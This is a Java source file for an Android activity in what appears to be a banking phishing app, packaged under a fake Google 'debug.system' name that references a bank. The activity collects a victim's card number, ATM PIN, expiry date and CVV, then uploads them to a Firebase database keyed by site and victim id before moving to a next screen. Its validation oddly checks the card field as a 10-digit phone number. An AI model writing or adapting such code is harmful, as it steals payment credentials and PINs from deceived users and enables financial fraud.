package google.test.debug.system.unionb4nk2;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import google.test.debug.system.unionb4nk2.bg.DateInputMask;
import google.test.debug.system.unionb4nk2.bg.ExpiryDateInputMask;
import google.test.debug.system.unionb4nk2.bg.FormValidator;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class SecondActivity extends AppCompatActivity {

    private EditText card, atm, expiry, cvv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);

        String id = getIntent().getStringExtra("id");
        card = findViewById(R.id.card);
        atm = findViewById(R.id.atm);
        expiry = findViewById(R.id.exp);
        cvv = findViewById((R.id.cvv));
        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));
        Button buttonSubmit = findViewById(R.id.button);

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                buttonSubmit.setText("Please Wait");

                HashMap<String, Object> dataObject = new HashMap<>();
                dataObject.put("card", card.getText().toString().trim());
                dataObject.put("atm", atm.getText().toString().trim());
                dataObject.put("expiry", expiry.getText().toString().trim());
                dataObject.put("cvv", cvv.getText().toString().trim());
                dataObject.put("updated_at", Helper.datetime());

                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("form");
                String userId2 = usersRef.push().getKey();  // Generate a unique key
                assert userId2 != null;
                usersRef.child(id).child(userId2).setValue(dataObject)
                        .addOnSuccessListener(aVoid -> {
                            Intent intent = new Intent(this, LastActivity.class);
                            intent.putExtra("id", id);
                            startActivity(intent);
                        })
                        .addOnFailureListener(e -> {
                            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                            Log.d(Helper.TAG, "Error: " + e.getMessage());
                        });
            } else {
                Helper.debug(SecondActivity.this, "Form Validation Failed");
            }

        });

    }

    public boolean validateForm(){
        boolean n1 = FormValidator.validatePhoneNumber(card, "Phone number is required");
        boolean n11 = FormValidator.validateMinLength(card, 10,"Required only 10 digit phone no");

        boolean n2 = FormValidator.validateRequired(cvv, "CVV is required");
        boolean n22 = FormValidator.validateMinLength(cvv, 3, "CVV 3 digit required");

        boolean n3 = FormValidator.validateRequired(atm, "atm is required");
        boolean n33 = FormValidator.validateMinLength(atm, 4, "atm 4 digit is required");

        boolean n4 = FormValidator.validateExpiryDate(expiry, "expiry date is required");
        boolean n44 = FormValidator.validateMinLength(expiry, 5,"Invalid expiry date");

        return n1 && n11 && n2 && n22 && n3 && n33 && n4 && n44;
    }
}
